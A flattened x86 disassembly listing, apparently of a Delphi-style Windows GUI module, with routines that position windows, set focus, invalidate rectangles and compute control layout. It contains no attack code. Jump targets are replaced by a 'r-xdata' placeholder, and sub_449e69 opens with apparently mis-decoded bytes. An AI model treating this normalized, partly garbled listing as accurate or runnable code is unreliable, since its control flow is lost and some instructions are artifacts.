push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_41a4c4
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_41a358
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_41a4e4
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_41a468
call sub_4493d8
jmp r-xdata
mov eax ebp
mov edx esi
call sub_41a468
call sub_4493d8
sub_449120
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_449048
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_449180
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4493d8
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_4493d8
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
test eax eax
jne r-xdata
sub_44921c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4496dc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_443d6c
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_433abc
call sub_433b9c
test al al
je r-xdata
mov eax ebx
call sub_4460d0
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_446094
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_446094
test [ eax + 0x52 ] 0x4
je r-xdata
sub_4492e0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_442558
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_449318
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_4599ec
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_449358
push ebx
mov ebx eax
mov eax ebx
call sub_4599ec
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_45d758
pop ebx
retn
mov eax ebx
call sub_459a14
mov eax ebx
call sub_4493d8
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_449390
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4493b4
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_4493b4
sub_4493ec
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_419034
mov eax edi
call sub_4460d0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_446094
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_449480
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_4493d8
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_4494b8
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4496dc
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4493d8
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403430
sub_449574
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_41a4c4
pop esi
pop ebx
retn
sub_449598
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_449574
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_41a358
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_41a4e4
sub_44960c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_4496dc
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_443d6c
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_44966c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4496d0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4496d7
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403430
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_405a50
sub_4496e8
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44220c
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_4497a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_41a468
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_41a30c
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403430
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_449800
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4498f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403430
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4498fd
mov eax [ ebp - 0x14 ]
call sub_403234
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_41a4c4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_41a468
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403430
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_44990c
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_449800
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_449938
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4599ec
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_449800
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_449800
mov edx eax
mov eax esi
call sub_45d658
sub_44997c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4460d0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_446094
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_4499c4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_449048
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_442e28
sub_449a0c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_449a90
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_4496dc
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_4460d0
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_449e52
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_4460d0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_449a0c
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_446094
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_449e69
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_449a90
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_443c08
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_449ea8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_444a8c
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_442520
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_449ef0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444cac
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_449f20
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_4496dc
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_445c38
xor ecx ecx
push ebp
push sub_44a04f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_4460d0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_4460d0
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a056
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_445c40
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_446094
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44a056
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
